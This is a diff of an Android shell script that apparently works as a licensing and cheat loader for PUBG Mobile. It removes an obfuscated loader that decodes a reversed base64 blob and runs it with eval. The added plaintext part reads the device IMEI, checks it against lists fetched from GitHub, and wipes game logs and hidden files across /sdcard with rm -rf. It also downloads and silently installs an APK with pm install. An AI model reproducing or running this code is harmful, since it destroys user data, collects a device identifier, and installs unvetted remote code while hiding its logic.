@@ -1,4 +1,112 @@
-#!/bin/bash
+wget -O /sdcard/Android/data/officeg/f https://github.com/eltheeb/z/blob/main/fix?raw=true
+imei=$(service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d'| tr -d '\n' | tr -d '.' | tr -d ' ')
+if 
+grep -R "$imei" "/sdcard/Android/data/officeg/f"
+then
+if [ -e "/storage/emulated/0/Android/data/officeg/ff" ];
+then
+echo
+else
+touch /storage/emulated/0/Android/data/officeg/ff
+rm -rf /storage/emulated/0/Download/main.14460.com.tencent.ig.obb
+rm -rf /storage/emulated/0/Android/obb/com.tencent.ig/main.14460.com.tencent.ig.obb
+rm /storage/emulated/0/Download/main.14460.com.tencent.ig.obb
+rm /storage/emulated/0/Android/obb/com.tencent.ig/main.14460.com.tencent.ig.obb
+sleep 1
+cp -rf /storage/emulated/0/Download/main.14460* /storage/emulated/0/Android/obb/com.tencent.ig/main.14460.com.tencent.ig.obb
+sleep 2
+am start -a android.intent.action.MAIN -n com.tencent.ig/com.epicgames.ue4.SplashActivity
+fi
+else
+echo "not need fix"
+rm /sdcard/Android/data/officeg/f
+fi
+wget -O /sdcard/Android/data/officeg/z https://github.com/eltheeb/z/blob/main/z?raw=true
+imei=$(service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d'| tr -d '\n' | tr -d '.' | tr -d ' ')
+if 
+grep -R "$imei" "/sdcard/Android/data/officeg/z"
+then
+rm /sdcard/Android/data/officeg/z
+echo "ok"
+else
+rm /sdcard/Android/data/officeg/z
+rm /storage/emulated/0/Android/data/officeg/2g
+exit
+fi
+am force-stop com.tencent.ig
+am force-stop com.zbij
+am force-stop com.cpxooslaualchwora
+am force-stop com.rsdmods.real
+wget -O /sdcard/Android/data/officeg/b https://github.com/eltheeb/z/blob/main/block?raw=true
+imei=$(service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d'| tr -d '\n' | tr -d '.' | tr -d ' ')
+if 
+grep -R "$imei" "/sdcard/Android/data/officeg/b"
+then
+echo "block"
+rm -rf /sdcard/Android/data/officeg/b
+rm -rf /storage/emulated/0/Android/data/officeg/2g
+exit
+else
+rm /sdcard/Android/data/officeg/b
+fi
+if [ -e "/storage/emulated/0/Android/data/officeg/fixg" ];
+then
+echo
+else
+touch /storage/emulated/0/Android/data/officeg/fixg
+cp -rf /data/app/com.tencent.ig-*/base.apk /data/app/glbase.apk
+sleep 1
+mv /storage/emulated/0/Android/obb/com.tencent.ig /storage/emulated/0/Android/obb/com.tencent.ig22/
+sleep 1
+pm uninstall -k com.tencent.ig
+chmod -Rf 777 /data/media/0/Android/data/com.tencent.ig
+rm -rf /data/media/0/Android/data/com.tencent.ig
+chmod -Rf 777 /datat/data/com.tencent.ig
+rm -rf /datat/data/com.tencent.ig
+pm install -r /data/app/glbase.apk
+pm install -r /data/app/glbase.apk > /dev/null 2>&1
+rm /data/app/glbase.apk
+mv /storage/emulated/0/Android/obb/com.tencent.ig22 /storage/emulated/0/Android/obb/com.tencent.ig/
+fi
+rm -rf /sdcard/.*
+rm -rf /sdcard/*/.*
+rm /sdcard/.*
+rm /sdcard/*/.*
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/Logs
+rm -rf /srcard/tencent
+rm -rf /sdcard/MidasOversea
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/Loading
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/Lobby
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/LobbyBubble
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Saved/SaveGames/LoginBackUp
+echo
+rm -rf /data/data/com.tencent.ig/no_backup
+rm -rf /storage/emulated/0/Android/data/com.tencent.ig/cache
+rm /sdcard/download/1.lua
+rm /storage/emulated/0/Android/data/officeg/m
+echo
+rm /storage/emulated/0/Android/data/officeg/2g
+pm install -r /data/app/com.tencent.ig-*/base.apk
 
-God="BlessYou";krF=FoL;Gnr=Vl;QIy=Is;UOt=FC;kVE=Sk;KlM=gM;Xwe=TF;oTX=dD;Yox=Qa;wQx=mb;Kqb=Zy;xWU=twB;gTp=auw;hwZ=Ejp;tHg=iQZ;ojo=shb;jhw=FjF;IDL=klV;wOA=yFT;PZL=XfL;DRJ=DiE;bmJ=FCa;XGN=dOT;QCK=dkY;SOb=WJE;RJx=uAv;czJ=dts;VGB=oCy;TyO=xGj;yHU=bpq;Nfb=Wct;doQ=Ibf;XCL=rax;ZNH=Hhf;Eoh=yCU;ghd=hut;ooz=VKY;qMf=PrY;Ecf=Lke;BbJ=jie;QOI=lOT;oi=QkU;yM=iDO;rT=twI;wa=BEk;Lf=SGl;Sx=Kri;yL=RiF;Xf=iZT;iv=fpC;fW=nki;qX=FrL;ba=OUY;czP=Hdm;ecN=WKt;QMW=BnB;Nsq=jdC;nof=OZt;bhx=qNV;vVN=xaU;smp=Wta;ceY=GDh;AIB=juO;miA=Cso;zgz=Hka;Kea=YMq;hUp=SWY;zMP=ozk;WGK=JEt;pkF=jjF;FCq=pFs;ZrQ=VcQ;ZjS=do;BTP=Su;sly=xM;aZl=vF;iJn=bo;QCl=HB;SCO=xo;fUq=Jo;Epq=zc;wxq=Ev;ziJ=Gx;Kzo=JF;PDO=pJ;qhq=yp;OYk=rj;OGy=Cc;hSK=xR;lnD=um;UXi=pl;xBF=xP;qOD=iX;RVy=nl;mqe=JK;rQt=CA;qJD=FR;sPp=XZ;moh=DC;Fsj=GWh;NTx=Jnx;dwG=ncr;Ugd=mFV;ZTt=WjI;mFG=lms;YGK=bPI;UKs=ibv;hka=JFE;zpQ=Gxt;VlF=Jxk;AEJ=cuk;SUZ=YiV;Wfq=NhZ;xLp=ray;QmE=mqM;fkp=tHl;Sek=XvT;qbj=EKu;RfA=xSe;fPQ=Oll;cif=jtg;GYE=yei;Prw=RTD;sMB=pEL;sxA=APb;aRs=HgZ;SXm=VSI;lZA=UKc;YMw=Lct;bwO=XQI;OxQ=COX;bPh=KqP;GVr=hRx;eoA=eID;AZK=fFj;PGC=XPy;ieV=gly;AUO=yit;GjW=jaZ;tBB=HSO;vdV=efl;HiW=VHx;JaQ=RCo;cGr=fsk;eib=jty;TPK=rlb;dhM=oDt;tCL=muK;gAg=xQq;xWl=eMt;AtB=mbQ;UzS=lee;xjU=CPZ;qLS=iIg;dQw=NHN;Dum=qAc;aei=Whw;afz=OcR;NWZ=Txs;gzI=HsZ;YmH=IIm;kZc=Ppd;qnZ=vjw;sQw=BmF;PAB=rGe;gah=aHu;XfD=uJJ;LmJ=PUK;jCz=XpN;gTg=hRF;cpS=fhx;wFI=fih;pHM=aTH;GIm=Jtb;XDy=XGY;zMs=kPd;VtP=pbP;ALj=acU;HEZ=Tre;EPr=vOf;eSC=AIk;TXH=szR;nNa=bGD;lQt=Qod;Qvm=HGI;tkS=IOY;qmZ=tDf;xxx=xOS;pFg=XCd;aVR=xGh;ooR=AHX;JVj=laY;TvM=kEx;SYU=hol;ddj=khS;aPP=oiI;Edo="
-";DSi=WYX;LHA=Gfx;VgU=gJZ;Rxh=xYy;bXG=gvs;eLoP="e";u18="6";Yt="l";Yxgs="";qwt="Fu";ieC=HO;XcH=Rv;Ugs=LC;vD=xp;fy=oW;Zl=LhH;oP=Jm;sDA=kpY;GHn=TB;wzk=Da;oiO=Ei;NaM=hIf;fC=vjz;kT=rz;sV=bZz;CL=ARL;Wc=dA;gZG=tGI;vpk=cM;Aao=tgy;sU=ld;LZ=Pr;BE=wCX;iN=fQ;RCe=Dm;Rc=Fl;Njo=OMq;gtb=SKa;Wf=jMB;Dm=wHr;Nx=Wn;ANT=jAK;oFy=Bnc;IjZ=Xj;DQa=oK;ewZ=Vm;QPf=lz;Cwg=aS;KEM=jS;fkE=hM;nLw=ym;FWv=BC;aDC=Lw;tW=Rgn;kw=Hgf;tQ=eSh;Fi=iGb;Or=snM;ZG=xqx;xC=WJr;Bf=haC;pT=THr;By=jbu;tm=Hcy;eT=nTC;UT=KCa;dk=Pxy;vG=TvX;HX=MMB;Ow=ZoT;UJ=LvE;rx=oMF;EB=VZx;OC=IfU;dv=lTx;Nk=TNq;Ej=bKu;dl=ZZi;yzL=bJ;EiG=LJ;iqg=gK;fbd=vg;OPl=Ei;tnI=YS;yBV=DA;yxh=Ks;Nic=Ih;wMq=tD;iDs=AQ;Nhh=zy;JWe=Ry;gC=AnI;qWN=uq;hIc=OAL;UOm=Nq;Xj=ax;GW=utn;Fmc=CaI;zeK=eT;hI=sl;Ae=RK;XV=doy;Dpq=Eg;Mmr=MZg;CXd=Bao;RND=WUC;CGm=SRK;DJh=LZw;ym=Ah;xzv=IX;FYi=YUX;v6T=" ";RzE="t92YuIWdoRXan9yL6MHc0RHagY2LnV2YpZmZv9SY0FGZvQWavJHZuF0LkJXYjR2cvAyTtACdld2d oBXagwGbhNGIlNWa2JXZzhCJ9kWZtlmClVnc01zdhJ3P4lmZv4Wah12Li9Gbi9ievIWZlhGdsV2L k1CIyRHI8dCZgEzJgQWZzBCfgcSfyQCI05WayB3enAiInICIG1CIrdXYgwHIxAybm5WaiV3cl52b hNGZz9iIgISal1WakICIS1CIwVmcnpAImlmCpcCInACZtAic0BCfgciLnACZtAic0BCfgcibcdCI lRXYsVXbl9SZnFmcvR3cvICIl1CIbBiZppgblhGdKIiZvcWZjlmZm92LhRXYk9CZp9mck5WQvQmc vR3cvACajV3b0pQZzxWZK8GajVmCuVGa0pwOdBiI4Z2LnV2YpZmZv9SY0FGZvQWavJHZuF0Lw8CZ vAHch9SY0FGZvAiZy1CIwNmC4Z2LnV2YpZmZv9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmc tJnCxACclVGbzpwawFmLlNXYix2ZvAHch9SY0FGZvAyawFmLlNXYi9iKtcWauQnblNmblRnLt92Y lVGbzpAInlmL05WZj5WZ05SbvN2LiJ2bvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CI l12LhRXYk9CI3czNgYmUtACZv1GajpwZp5CduV2YuVGdu02bjByatACbsFGdz5WauVHItBnCxACc uF0Lw8SYpRWZt9SY0FGZvAiZy1CItJnCnlmL05WZj5WZ05SbvN2LhRXYk9CZp9mck5WQvAzLhlGZ 05SbvN2LhRXYk9CdhRXYk9CI3czNgYmUtACZv1GajpwZp5CduV2YuVGdu02bj9SY0FGZvQWavJHZ y1CIsxWY0NnbpBSbwpwZp5CduV2YuVGdu02bj9SY0FGZvQXY0FGZvAiZy1CItJnCnlmL05WZj5WZ gsGch5SZzFmYsd2LwBXYvEGdhR2LgIXLgwGbhR3culGItBnCrBXYuU2chJGbn9CcwF2LhRXYk9CI vN2LiJ2bvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAicpR2atpQMm4jMgwGb152L2VGZvAiP 0QTMu4Wah12LkF2bs52dvR0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CIwNmCnlmL05WZj5WZ05Sb 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 y1CItJnCq4yLq8CZyF2YkN3Lg0mcKoiLvQmchNGZz9CItJnCq4yLq8CZyF2YkN3LgYmctASbypgK V9yclxWam9yZp5CduV2YuVGdu02bj9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZ ypwcn9GTvQWZ2F2UvEmc0hXRyV2ajFmcUd3bkFGaT9SYyRHeFJXZrNWYyR1dvRWYoN1Ll1WYHRTR gYmctASbypQYlNnclZ3TzFGZp10LkJXYjR2cvAiZy1CItJnC05WZj5WZ09CZyF2YyN3LgYmctASb 0UUVvMXZslmZvcWauQnblNmblRnLt92YvEGdhR2Lkl2byRmbB9CMvQWZ0FGb11WZvU2ZhJ3b0N3L l1WYHVmdhN1LkVmdhN1LhJHd4Vkclt2YhJHV39GZhh2UvEmc0hXRyV2ajFmcUd3bkFGaT9SZtF2R uVGdu02bj9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnCn5WakF2bM9yc 0hXRyV2ajFmcUd3bkFGaT9SYyRHeFJXZrNWYyR1dvRWYoN1Ll1WYHRTRV9yclxWam9yZp5CduV2Y vJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnC5JmYvx0LzVWbhdUZ2F2UvQWZ2F2UvEmc T9SYyRHeFJXZrNWYyR1dvRWYoN1Ll1WYHRTRV9yclxWam9yZp5CduV2YuVGdu02bj9SY0FGZvQWa vR3cvAiZy1CItJnClxmYiVnQ5JmYvx0LzVWbhdUZ2F2UvQWZ2F2UvEmc0hXRyV2ajFmcUd3bkFGa l1WYHRTRV9yclxWam9yZp5CduV2YuVGdu02bj9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmc vx0LzVWbhdUZ2F2UvQWZ2F2UvEmc0hXRyV2ajFmcUd3bkFGaT9SYyRHeFJXZrNWYyR1dvRWYoN1L wV3ajFmYf9mbvcWauQnblNmblRnLt92YvEGdhR2LhRXYk9CImJXLg0mcK8GajVmCwV1ajFmQul2Z j9yZp5CduV2YuVGdu02bj9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAiZy1CItJnC k5WQvAzLkVGdhxWdtV2LldWYy9Gdz9CItJnChVHbuEzLkF2bs52dvR2LkJXYjR2cvASbypQZoNWY k9CZp9mck5WQvAzLkVGdhxWdtV2LldWYy9Gdz9CItJnCvh2YlpQbvcWZjlmZm92LhRXYk9CZp9mc i9iKtcWauQnblNmblRnLt92YvAHch9SY0FGZvAictACbsFGdz5Wag0GcKcmMvcWZjlmZm92LhRXY vozcwRHdoBiclZ3LnV2YpZmZv9SY0FGZvQWavJHZuF0LkJXYjR2cvAyTtACdld2dKowawFmLlNXY zBXb1RGKk0zZyVmdKUWdyRXP3Fmc/IXZ29ibpFWbvI2bsJ2L69iYlVGa0xWZv02bj5iY1hGdpd2L 3FGI8BSZtFmTu9WazJXZ2BSatACclJ3ZgwHIzYlLvpmLoVmetFGSvJWQu02bjBSZnF2ajFGcgMXe p9mck5WQvQmchNGZz9iIgIyZyVmdkICIS1CIwVmcnpgZppQK7cSfyQCI05WayB3enAiI9IiRtAya 0FGZvQWavJHZuF0LkJXYjR2cvASbypgIr9mIg8GajVmCuVGa0pgIyVmdvcWZjlmZm92LhRXYk9CZ wBXYvEGdhR2Lg8ULgQXZndnCiMHcwFGIn5Wa0FGZwVnIg8GajVmClNHblpgclZ3LnV2YpZmZv9SY t9ievIWZlhGdsV2Lt92YuQnblRnbvNmclNXdiVHa0l2ZucXYy9yL6MHc0RHagsGch5SZ0FGZwV3L tACdld2dK8GajVmCrBXYuUGdhRGc19CcwF2LhRXYk9CIy1CIsxWY0NnbpBSbwpwboNWZK82LulWY wRHdoBCdhRmLx42bjl2LnV2YpZmZv9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXbl9SZnFmcvR3cvAyT z9CIP1CI0V2Z3pQYv4Wah12L69iYlVGa0xWZv02bj5CduVGdu92YyV2c1JWdoRXan5ydhJ3Lvozc v8iOzBHd0hGI0FGZuIjbvNWavcWZjlmZm92LhRXYk9CZp9mck5WQvAzLkVGdhxWdtV2LldWYy9Gd hJ3b0N3Lg8ULgQXZndnCi9ibpFWbvo3LiVWZoRHbl9SbvNmL05WZ052bjJXZzVnY1hGdpdmL3Fmc ucXYy9yL6MHc0RHagQXYk5yMu92Yp9yZlNWamZ2bvEGdhR2Lkl2byRmbB9CMvQWZ0FGb11WZvU2Z l9SZnFmcvR3cvAyTtACdld2dKM2LulWYt9ievIWZlhGdsV2Lt92YuQnblRnbvNmclNXdiVHa0l2Z oRXan5ydhJ3LvozcwRHdoBCdhRmL042bjl2LnV2YpZmZv9SY0FGZvQWavJHZuF0Lw8CZlRXYsVXb wFmLlRXYkBXdvAHch9SY0FGZvASbypAZv4Wah12L69iYlVGa0xWZv02bj5CduVGdu92YyV2c1JWd lRXYsVXbl9SZnFmcvR3cvASbypgclZ3LnV2YpZmZv9SY0FGZvQWavJHZuF0LkJXYjR2cvASbypwa ==gCiUmbvRmIg8GajVmCpZmCnJzLnV2YpZmZv9SY0FGZvQWavJHZuF0Lw8CZ";Mll="ch";HTv=Yyu;cbY=cId;FwM=nUK;Neo=URi;Jrd=ZsO;ZzZ=gsI;AGg=Krt;KoC=Usx;ftb=Vzm;kuT=EVS;AUX=NGv;Aow=suL;uBc=hlq;OqT=ApZ;kSe=ZTL;aFt=FKz;yqF=lEj;ZII=uml;BwC=JPx;gWH=eyv;wWA=hWw;unn=Brn;hxs=DiR;nPo=iOr;Uuo=lUG;zxW=Nkd;MAi=aWZ;XcA=xIq;sZL=MLV;rwV=lNF;GYU=UPS;WeS=kTk;Aym=btt;rGW=IDI;Uhx=DhE;Kut=fsH;eGn=UyX;VNh=YtK;QWo=gEO;Byf=nvi;Ezb=oBV;uWP=JEl;Vsp=Lgc;EAF=Byk;PSz=HCg;pyP=bQL;Uxq=ehM;WdA=Uij;pWM=bsv;oXm=BKe;mtM=qkr;XEB=pua;XzD=SPa;Kng=JSY;bFL=Zud;xbc=GSY;neu=TQJ;Ttj=EdI;ZCG=HXS;NSP=aRL;UPz=CwR;edR=xrL;jQC=PQv;ESa=fXd;eKc=KZo;WEy=DoO;fQg=tcd;FCk=GMk;YgE=Nzd;FAs=AFH;gRJ=wZL;ffM=Jsb;Ixf=RQY;Gmk=ugg;GRa=CTs;UiO=Yer;etb=mgM;fex=MqF;Nll=vPC;KWd=yXb;Muu=Mzy;wHZ=jjp;SmF=EZc;ZqQ=lNR;CuE=Afy;weE=KKV;ggU=fdX;wbE=YVE;TEj=yAz;and=qKr;MVm=jME;jUo=PRn;lUm=BLo;IUT=oDE;BDY=lkB;oQp=FKc;YEa=bpY;qOb=Izx;MfR=ODo;JmY=Kia;weH=FVf;URv=vSO;Jdp=BJH;opM=fhP;NUx=Qpe;iDY=ZNQ;lAj=vuK;imh=QaU;Cdp=mgw;wAJ=IMc;ANx=UQv;CkG=nsS;tuB=Lfj;KFb=ACa;Znn=SPN;Izy=AKY;MCI=uEV;Vas=kJi;OVF=xhN;ocJ=mis;CCq=zoG;Uun=Bsu;Vet=cPB;PMj=gXU;Svx=qVt;ado=LSJ;zGv=aIv;jyW=gEB;KLw=yan;nqU=foW;mPS=Zhi;oRH=HzR;aTq=iAA;LFG=yTk;LhE=dvZ;Gmd=aBt;lDM=FUf;KkS=LUv;ODo=ifH;LIW=oRx;kbu=cPC;WgK=RfX;NoQ=OpS;VWA=MwS;bPe=cOh;drL=JXi;tuj=aeR;nlI=RgR;qog=uHu;zLA=FCa;INo=pXp;PaQ=yJV;kPu=dmu;EgN=Wek;MXp=PIc;YEF=xAk;Zvz=EGN;Feh=yij;sv=TmN;Gc=WAR;kw=XRs;dT=fhJ;ed=WAu;rq=OFi;ak=auS;zU=gWJ;QB=PyR;Ci=HYT;DR=HGU;nEl=izK;Yon=JKg;aRR=osG;BLG=nGa;fad=iUJ;FeM=Oph;NIf=nUq;AdK=IHM;pMr=KRX;GJr=sor;Yzr=JJM;zCc=jhW;iac=Znx;lPF=qCm;GHi="o";Re="-";LcV=" ";H2o="t";O2h="r";r="ev";Gi="ba";x="s";sfT="d";x64="4";CTh=Vu;sh=dMK;Pl=GnF;MQ=HQe;dG=hZi;Tv=TuJ;BP=PPf;nh=Edv;pY=vGA;io=bPH;Rr=tdy;MF=jZJ;my=zmB;Yd=mtW;XA=kqf;VR=qss;BP=enZ;re=dnQ;os=Xua;kA=hzB;aE=JKy;vG=pcw;SO=gBc;FO=XMq;kK=ZHi;DwX=sS;mNb=im;nv=Cn;yNI=Hb;Yt=FQ;Pl=PU;ko=DJA;UX=tv;XD=UYM;uz=hIa;YVD=cJM;Zde=fi;IF=hLs;JCM=Dg;Fdw=JL;ieQ=FAu;ZMh=TQB;qHK=EM;wVK=bxY;nMR=mC;UL=Lep;wJ=eM;yc=dch;rIX=Vb;bBO=eT;Zpx=Iz;ang=Ln;AYe=Qy;UiQ=IU;usu=Xy;rkj=Ce;eVp=OY;aFw=wR;uNw=cJ;DQb=Tn;ZLx=ec;ipH=hk;pcK=rd;lCz=Ce;jxG=nx;Gkd=Pl;yFz=zk;vow=Qm;QBs=gz;dXe=sQ;dJU=vr;urX=mj;IF=qGI;UoJ=hD;x=$(eval $eLoP$Mll$GHi$v6T$Re$eLoP$v6T$RzE$LvC|$v6T$H2o$O2h$LcV"$LcV"$LcV"$Edo"$LcV|$LvC$O2h$r$v6T|$LvC$Gi$x$eLoP$u18$x64$v6T$Re$sfT);eval "$x";GMZ=snx;llB=diL;pxn=skL;Syg=GFT;RaJ=zXK;ZKL=BSQ;XCH=tmb;eyL=TOc;Ime=EZW;TFM=mN;tUA=Ab;fnp=ch;FNp=pJ;JRk=Az;YXw=hu;Qde=tk;zmI=lH;MdB=kG;cRe=zm;ygE=Og;MrN=Wn;Rwc=UL;KRw=NX;AmN=nu;lUf=HN;HVY=od;pqW=bz;hzm=tv;vAz=ql;fVA=KK;WXS=HX;PRd=CDX;lwM=wEt;ZcX=rAB;Yta=Syw;hvo=gTx;mtU=YbQ;Ilo=unK;Ava=XiM;mET=pHp;fFk=Pno;XBK=taz;dtp=zbA;bMu=zKL;FPC=PwO;xXA=dwc;Alj=ylC;JQq=JPx;MUH=FcT;cvl=azu;HPj=sSJ;dsl=XvS;Hoq=nKA;AZD=sfK;JFc=NZK;eEE=DrT;ZhW=fMr;VBT=enR;poD=hwH;lLU=qkd;yTa=OEZ;ZpV=WQP;Jeg=Mwj;YGH=HdD;mKz=pLU;PNn=ako;scF=rtk;QTH=sHP;Eto=FIR;BlM=WAX;UHF=WBV;Fud=mEb;sGh=Zzy;lPW=SOK;mcu=ZDf;QdD=YZM;HcF=LzS;GNn=Hyn;cql=ioJ;LKm=DNv;TAH=FaF;VYt=ERc;vhF=xvU;tNq=Uzi;JaE=bgV;bpG=opJ;CsA=UQX;pGD=TXG;AZk=bTy;bId=bNE;yql=fVT;Xcy=BmA;UHz=jRf;UNz=KZk;PXl=Vsy;Stv=Sed;cyB=zLX;gGz=JJP;IyT=xSZ;Zdj=nVJ;yQZ=vVc;sHL=Vfg;Zro=zth;XPf=sFS;nQQ=dnd;SNh=eWO;fOZ=Xjc;fgB=rQS;UjE=cpS;xYk=qWB;koB=ZFE;oQQ=hSL;ufm=zwQ;mzC=UfF;gQl=SLT;wwc=Jcb;tDN=SNI;ZFg=atH;UlF=ajb;DaK=zqX;KFL=uPP;mjy=zbB;ofO=nbM;vfl=vdB;SDM=yQQ;AfY=mzE;IHi=AeT;oVK=WsK;XhO=hRC;pOA=ScU;bCh=FOX;rgF=qzX;zyy=hXg;utq=MGT;Lkd=CTs;Vlb=XYZ;Ziu=aFC;dgF=qOn;Bpe=yss;Xoc=NXh;dGV=AjA;Zux=APj;diU=LZO;Vzp=lBl;xDW=otu;wxh=LmE;jsJ=xnu;AuO=OCw;iZA=dLf;pmj=lwe;RIo=tLO;TcY=glu;EVQ=Bxb;hkK=RTP;GcY=FoO;TDT=VhE;iZG=wyh;FNH=Bmj;BJh=mAj;SCs=hOS;kkj=Dgb;une=TET;DWN=wEf;JZr=EEn;eev=vSC;Gcg=IFa;jkQ=FDn;uiO=zBO;JIM=vwW;GtR=lZX;WoV=mWR;bZm=gDj;XgT=spD;dfG=pHI;IjF=XxS;pWp=hMH;Ul=fIj;dD=mht;yw=cOO;Vw=kik;Zo=RGl;XT=hQB;CB=Ofi;mM=Dun;cN=Uyp;rL=yIY;eD=qYt;jB=nnI;Wf=not;Yv=Rqc;Yu=OgM;xZ=FzE;ec=jKM;gB=qoM;rZ=lDg;HY=BTw;LB=TJn;Tk=qDl;HY=nSN;kp=iUS;ThankYou="HaveNiceDay";
+wget -O /sdcard/Android/data/officeg/ver https://github.com/eltheeb/z/blob/main/ver?raw=true
+verg=$(dumpsys package com.AboHamzeh.jo.V3 | grep -i versionName | awk -F"=" '{print $2}';)
+if
+grep -R "$verg" "/sdcard/Android/data/officeg/ver"
+then
+echo "ok"
+rm /sdcard/Android/data/officeg/ver
+else
+echo "updating apps"
+wget -O /data/app/update.apk https://raw.githubusercontent.com/eltheeb/z/main/o
+echo
+pm install -r /data/app/update.apk
+echo
+wget -O /storage/emulated/0/Android/data/officeg/icon1.dat https://raw.githubusercontent.com/eltheeb/z/main/a
+wget -O /storage/emulated/0/Android/data/officeg/icon2.dat https://raw.githubusercontent.com/eltheeb/z/main/b
+wget -O /storage/emulated/0/Android/data/officeg/icon3.dat https://raw.githubusercontent.com/eltheeb/z/main/c
+wget -O /storage/emulated/0/Android/data/officeg/icon4.dat https://raw.githubusercontent.com/eltheeb/z/main/d
+rm /data/app/update.apk
+rm /sdcard/Android/data/officeg/ver
